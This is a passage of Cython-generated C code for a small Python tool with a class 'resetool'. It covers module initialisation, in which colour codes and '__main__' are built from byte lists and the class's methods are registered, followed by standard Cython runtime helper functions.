  if (PyDict_SetItem(__pyx_d, __pyx_n_s_refresh, __pyx_t_1) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_27);
  __Pyx_GIVEREF(__pyx_int_27);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_27);
  __Pyx_INCREF(__pyx_int_91);
  __Pyx_GIVEREF(__pyx_int_91);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_91);
  __Pyx_INCREF(__pyx_int_52);
  __Pyx_GIVEREF(__pyx_int_52);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_52);
  __Pyx_INCREF(__pyx_int_54);
  __Pyx_GIVEREF(__pyx_int_54);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_54);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bgcyan, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_27);
  __Pyx_GIVEREF(__pyx_int_27);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_27);
  __Pyx_INCREF(__pyx_int_91);
  __Pyx_GIVEREF(__pyx_int_91);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_91);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_50);
  __Pyx_GIVEREF(__pyx_int_50);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_50);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_green, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_27);
  __Pyx_GIVEREF(__pyx_int_27);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_27);
  __Pyx_INCREF(__pyx_int_91);
  __Pyx_GIVEREF(__pyx_int_91);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_91);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red, __pyx_t_1) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_27);
  __Pyx_GIVEREF(__pyx_int_27);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_27);
  __Pyx_INCREF(__pyx_int_91);
  __Pyx_GIVEREF(__pyx_int_91);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_91);
  __Pyx_INCREF(__pyx_int_57);
  __Pyx_GIVEREF(__pyx_int_57);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_57);
  __Pyx_INCREF(__pyx_int_51);
  __Pyx_GIVEREF(__pyx_int_51);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_51);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_109);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_LightYellow, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1clear_screen, 0, __pyx_n_s_clear_screen, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__6)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_clear_screen, __pyx_t_1) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_resetool, __pyx_n_s_resetool, (PyObject *) NULL, __pyx_n_s_source, (PyObject *) NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);

  
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_6source_8resetool_1__init__, 0, __pyx_n_s_resetool___init, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__8)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_init, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_6source_8resetool_3banner, 0, __pyx_n_s_resetool_banner, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__10)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_banner, __pyx_t_2) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_6source_8resetool_5resetdvmb, 0, __pyx_n_s_resetool_resetdvmb, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__12)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_resetdvmb, __pyx_t_2) < 0) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_6source_8resetool_7go, 0, __pyx_n_s_resetool_go, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__14)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_go, __pyx_t_2) < 0) __PYX_ERR(0, 90, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_resetool, __pyx_empty_tuple, __pyx_t_1, NULL, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_resetool, __pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_name_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_95);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyObject_RichCompare(__pyx_t_1, __pyx_t_2, Py_EQ); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 109, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_resetool); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 110, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 110, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_t_2) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_R); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_go); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
  }

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* decode_c_bytes */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    if (unlikely((start < 0) | (stop < 0))) {
        if (start < 0) {
            start += length;
            if (start < 0)
                start = 0;
        }
        if (stop < 0)
            stop += length;
    }
    if (stop > length)
        stop = length;
    if (unlikely(stop <= start))
        return __Pyx_NewRef(__pyx_empty_unicode);
    length = stop - start;
    cstring += start;
    if (decode_func) {
        return decode_func(cstring, length, errors);
    } else {
        return PyUnicode_Decode(cstring, length, encoding, errors);
    }
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
